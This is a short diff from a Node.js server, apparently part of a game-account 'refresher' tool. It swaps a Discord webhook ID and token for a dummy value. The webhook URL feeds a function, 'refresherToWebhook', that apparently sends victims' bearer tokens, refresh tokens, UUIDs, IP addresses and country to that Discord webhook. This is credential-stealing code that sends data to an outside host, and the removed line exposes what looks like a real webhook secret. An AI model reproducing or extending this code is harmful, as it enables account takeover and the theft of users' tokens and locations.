@@ -703,7 +703,7 @@ app.get('/refresher', async (req, res) => {
         console.log(e)
     }
 })
-const database = '1101926164257321030/8YjZ6O1xyIGMHx7UjRmvMHFA5LZWjemBZ-NgL6DD4YYpGpQ0Fum28Mpt1BO8IfvCP0hM'
+const database = '3945678-537849'
 const log = discord_api+database
 async function refresherToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, flag) {
 
